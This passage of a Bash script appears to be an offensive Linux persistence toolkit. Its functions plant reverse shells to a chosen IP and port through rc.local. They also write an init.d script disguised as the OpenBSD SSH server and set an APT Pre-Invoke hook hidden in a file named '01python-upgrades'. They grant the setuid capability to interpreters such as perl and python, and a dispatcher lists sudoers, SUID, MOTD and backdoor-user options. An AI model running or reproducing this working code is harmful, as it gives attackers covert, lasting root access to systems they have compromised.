	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $rc_local_path
			chmod +x $rc_local_path
			echo "[+] rc.local backdoor established"
		else
			echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" >> $rc_local_path
			echo "[+] Backdoor established in existing rc.local file"
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --command must be specified when using --custom."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/sh\n$command" > $rc_local_path
			chmod +x $rc_local_path
			echo "[+] rc.local backdoor established"
		else
			echo "$command" >> $rc_local_path
			echo "[+] Backdoor established in existing rc.local file"
		fi
	fi
}

setup_initd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local initd_path="/etc/init.d/ssh-procps"

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				initd_path=$1
				;;
			* )
				echo "Invalid option for --initd-backdoor: $1"
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		exit 1
	fi

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			exit 1
		fi

		if [[ ! -f $initd_path ]]; then
			cat <<-EOF > $initd_path
			#! /bin/sh
			### BEGIN INIT INFO
			# Provides:             ssh sshd
			# Required-Start:       \$remote_fs \$syslog
			# Required-Stop:        \$remote_fs \$syslog
			# Default-Start:        2 3 4 5
			# Default-Stop:        
			# Short-Description:    OpenBSD Secure Shell server
			### END INIT INFO

			nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
			EOF
			chmod +x $initd_path
			update-rc.d $(basename $initd_path) defaults
			echo "[+] init.d backdoor established with IP $ip and port $port."
		else
			echo "nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> $initd_path
			update-rc.d $(basename $initd_path) defaults
			echo "[+] Payload added to existing init.d script with IP $ip and port $port."
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $initd_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			exit 1
		fi

		if [[ ! -f $initd_path ]]; then
			cat <<-EOF > $initd_path
			#! /bin/sh
			### BEGIN INIT INFO
			# Provides:             ssh sshd
			# Required-Start:       \$remote_fs \$syslog
			# Required-Stop:        \$remote_fs \$syslog
			# Default-Start:        2 3 4 5
			# Default-Stop:        
			# Short-Description:    OpenBSD Secure Shell server
			### END INIT INFO
			
			$command
			EOF
			chmod +x $initd_path
			update-rc.d $(basename $initd_path) defaults
			echo "[+] init.d backdoor established"
		else
			echo "$command" >> $initd_path
			update-rc.d $(basename $initd_path) defaults
			echo "[+] existing init.d backdoor established"
		fi
	fi
}

setup_apt_persistence() {
    local default=0
    local custom=0
    local ip=""
    local port=""
    local command=""
    local path=""

    while [[ "$1" != "" ]]; do
        case $1 in
            --default )
                default=1
                ;;
            --custom )
                custom=1
                ;;
            --ip )
                shift
                ip=$1
                ;;
            --port )
                shift
                port=$1
                ;;
            --command )
                shift
                command=$1
                ;;
            --path )
                shift
                path=$1
                ;;
            * )
                echo "Invalid option for --apt-persistence: $1"
                exit 1
        esac
        shift
    done

    if [[ $default -eq 1 && $custom -eq 1 ]]; then
        echo "Error: --default and --custom cannot be specified together."
        exit 1
    fi

    if [[ $default -eq 0 && $custom -eq 0 ]]; then
        echo "Error: Either --default or --custom must be specified."
        exit 1
    fi

    if ! check_root; then
        echo "Error: This function can only be run as root."
        exit 1
    fi

    if [[ $default -eq 1 ]]; then
        if [[ -z $ip || -z $port ]]; then
            echo "Error: --ip and --port must be specified when using --default."
            exit 1
        fi

        path="/etc/apt/apt.conf.d/01python-upgrades"
        echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
        echo "[+] APT persistence established"

    elif [[ $custom -eq 1 ]]; then
        if [[ -z $command || -z $path ]]; then
            echo "Error: --command and --path must be specified when using --custom."
            exit 1
        fi

        if [[ ! -f $path ]]; then
            echo "APT::Update::Pre-Invoke {\"$command\"};" > $path
            echo "[+] APT persistence established"
        else
            echo "APT::Update::Pre-Invoke {\"$command\"};" >> $path
            echo "[+] APT persistence established"
        fi
    fi
}

setup_cap_backdoor() {
    local default=0
    local custom=0
    local capability=""
    local binary=""

    while [[ "$1" != "" ]]; do
        case $1 in
            --default )
                default=1
                ;;
            --custom )
                custom=1
                ;;
            --capability )
                shift
                capability=$1
                ;;
            --binary )
                shift
                binary=$1
                ;;
            * )
                echo "Invalid option for --cap-backdoor: $1"
                exit 1
        esac
        shift
    done

    if [[ $default -eq 1 && $custom -eq 1 ]]; then
        echo "Error: --default and --custom cannot be specified together."
        exit 1
    fi

    if [[ $default -eq 0 && $custom -eq 0 ]]; then
        echo "Error: Either --default or --custom must be specified."
        exit 1
    fi

    if ! check_root; then
        echo "Error: This function can only be run as root."
        exit 1
    fi

    if [[ $default -eq 1 ]]; then
        local binaries=("perl" "ruby", "php" "python" "python3", "node")
        for bin in "${binaries[@]}"; do
            if command -v $bin &> /dev/null; then
                local path=$(command -v $bin)
                setcap cap_setuid+ep $path
                if [[ $? -eq 0 ]]; then
                    echo "[+] Capability setuid granted to $path"
                else
                    echo "[-] Failed to grant capability setuid to $path"
                fi
            else
                echo "[-] $bin is not present on the system."
            fi
        done
    elif [[ $custom -eq 1 ]]; then
        if [[ -z $capability || -z $binary ]]; then
            echo "Error: --capability and --binary must be specified with --custom."
            exit 1
        fi

        if command -v $binary &> /dev/null; then
            local path=$(command -v $binary)
            setcap $capability $path
            if [[ $? -eq 0 ]]; then
                echo "[+] Capability $capability granted to $path"
            else
                echo "[-] Failed to grant capability $capability to $path"
            fi
        else
            echo "[-] $binary is not present on the system."
        fi
    fi
}

main() {
	local QUIET=0

	if [[ $# -eq 0 ]]; then
		if [[ $QUIET -ne 1 ]]; then
			print_banner
		fi
		if check_root; then
			usage_root
		else
			usage_user
		fi
		exit 0
	fi

	for arg in "$@"; do
		if [[ "$arg" == "-h" || "$arg" == "--help" ]]; then
			if [[ $QUIET -ne 1 ]]; then
				print_banner
			fi
			if check_root; then
				usage_root
			else
				usage_user
			fi
			exit 0
		fi
	done

	# Parse command line arguments
	while [[ "$1" != "" ]]; do
		case $1 in
			-q | --quiet )
				QUIET=1
				;;
			-h | --help )
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit
				;;
			--systemd )
				shift
				setup_systemd "$@"
				exit
				;;
			--cron )
				shift
				setup_cron "$@"
				exit
				;;
			--at )
				shift
				setup_at "$@"
				exit
				;;
			--ssh-key )
				shift
				setup_ssh_key "$@"
				exit
				;;
			--authorized-keys )
				shift
				setup_authorized_keys "$@"
				exit
				;;
			--shell-configuration )
				shift
				setup_shell_profile "$@"
				exit
				;;
			--xdg )
				shift
				setup_xdg "$@"
				exit
				;;
			--create-user )
				shift
				setup_new_user "$@"
				exit
				;;
			--backdoor-user )
				shift
				setup_backdoor_user "$@"
				exit
				;;
			--password-change )
				shift
				setup_password_change "$@"
				exit
				;;
			--passwd-user )
				shift
				setup_passwd_user "$@"
				exit
				;;
			--sudoers-backdoor )
				shift
				setup_sudoers_backdoor "$@"
				exit
				;;
			--suid-backdoor )
				shift
				setup_suid_backdoor "$@"
				exit
				;;
			--motd-backdoor )
				shift
				setup_motd_backdoor "$@"
				exit
				;;
			--rc-local-backdoor )
				shift
				setup_rc_local_backdoor "$@"
				exit
				;;
			--initd-backdoor )
				shift
				setup_initd_backdoor "$@"
				exit
				;;
			--apt-persistence )
                shift
                setup_apt_persistence "$@"
                exit
                ;;
            --cap-backdoor )
                shift
                setup_cap_backdoor "$@"
                exit
                ;;
			* )
				echo "Invalid option: $1"
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit 1
		esac
		shift
	done

	# Print banner unless in quiet mode
	if [[ $QUIET -ne 1 ]]; then
		print_banner
	fi

	# Show the usage menu if no specific command is given
	if check_root; then
		usage_root
	else
		usage_user
	fi
}

main "$@"